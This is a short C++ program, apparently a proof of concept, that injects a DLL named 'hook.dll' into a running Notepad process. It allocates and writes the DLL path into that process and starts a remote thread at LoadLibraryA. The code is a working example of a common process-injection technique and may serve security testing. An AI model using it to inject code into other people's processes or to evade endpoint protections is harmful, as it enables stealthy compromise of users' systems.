#include <windows.h>
#include <iostream>

int main()
{
    DWORD pid;
    std::cout << "Enter PID of Notepad: ";
    std::cin >> pid;

    const char* dllPath =
        "C:\\Users\\surajku5\\Downloads\\poc\\edlp_poc\\hook.dll";

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess)
    {
        std::cout << "OpenProcess failed\n";
        return 1;
    }

    LPVOID pMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
                                 MEM_COMMIT, PAGE_READWRITE);

    WriteProcessMemory(hProcess, pMem, dllPath,
                       strlen(dllPath) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)LoadLibraryA,
        pMem, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    std::cout << "DLL injected successfully\n";

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
